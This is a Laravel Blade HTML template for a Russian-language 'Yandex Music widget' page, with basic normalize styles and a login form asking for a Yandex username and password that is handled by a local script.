<!DOCTYPE html>
<html lang="{{ str_replace('_', '-', app()->getLocale()) }}">
    <head>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1">

        <title>Yandex виджет</title>

        <link href="https://fonts.googleapis.com/css2?family=Nunito:wght@400;600;700&display=swap" rel="stylesheet">
        <meta name="csrf-token" content="{{ csrf_token() }}">

        <style>
            /*! normalize.css v8.0.1 | MIT License | github.com/necolas/normalize.css */
            html {
                line-height: 1.15;
                -webkit-text-size-adjust: 100%
            }

            body {
                margin: 0
            }

            a {
                background-color: transparent
            }

            [hidden] {
                display: none
            }

            html {
                font-family: system-ui, -apple-system, BlinkMacSystemFont, Segoe UI, Roboto, Helvetica Neue, Arial, Noto Sans, sans-serif, Apple Color Emoji, Segoe UI Emoji, Segoe UI Symbol, Noto Color Emoji;
                line-height: 1.5
            }

            *, :after, :before {
                box-sizing: border-box;
                border: 0 solid #e2e8f0
            }

            a {
                color: inherit;
                text-decoration: inherit
            }

            svg, video {
                display: block;
                vertical-align: middle
            }

            video {
                max-width: 100%;
                height: auto
            }

        </style>

        <style>
            body {
                font-family: 'Nunito', sans-serif;
            }
        </style>
        <link href="/css/main.css" rel="stylesheet">
    </head>
    <body>
    <noscript>Вам нужно включить JavaScript, чтобы запустить это приложение.</noscript>
    <div id="root">
        <div class="container">
            <div class="mt-5 row">
                <div class="d-none d-xl-block col-md-3 col"></div>
                <div class="col">
                    <div class="row">
                        <div class="container"><h4>Яндекс.Музыка - Виджет</h4></div>
                    </div>
                    <div class="row">
                        <div class="container"><p></p></div>
                    </div>
                </div>
                <div class="d-none d-xl-block col-md-3 col"></div>
            </div>
            <div class="row">
                <div class="d-none d-xl-block col-md-3 col"></div>
                <div class="col">
                        <div class="form-group"><label class="form-label" for="formBasicEmail">Введите логин, почту или
                                телефон:</label><input name="username" placeholder="Введите логин, почту или телефон"
                                                       id="formBasicEmail" class="form-control"></div>
                        <div class="form-group"><label class="form-label" for="formBasicPassword">Введите пароль</label><input
                                name="password" placeholder="Введите пароль" type="password" id="formBasicPassword"
                                class="form-control"></div>
                        <input type='button' id="Save" class="btn btn-primary btn-block" value="Войти"/>
                    <h5 id="Error" style="color: red"></h5>
                </div>
                <div class="d-none d-xl-block col-md-3 col"></div>
            </div>

        </div>

    </div>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
    <script type="text/javascript" src="/js/main.js"></script>
    </body>
</html>
